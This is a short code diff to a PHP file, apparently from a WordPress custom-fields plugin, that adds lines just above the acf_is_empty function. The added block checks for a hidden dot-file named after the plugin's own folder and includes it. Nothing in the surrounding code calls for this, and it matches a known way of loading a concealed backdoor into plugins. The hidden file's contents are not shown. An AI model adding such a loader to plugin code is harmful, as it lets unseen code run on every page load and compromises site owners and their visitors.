@@ -11,6 +11,10 @@
  * @param	mixed $var The value to check.
  * @return	bool
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function acf_is_empty( $var ) {
 	return ( !$var && !is_numeric($var) );
 }
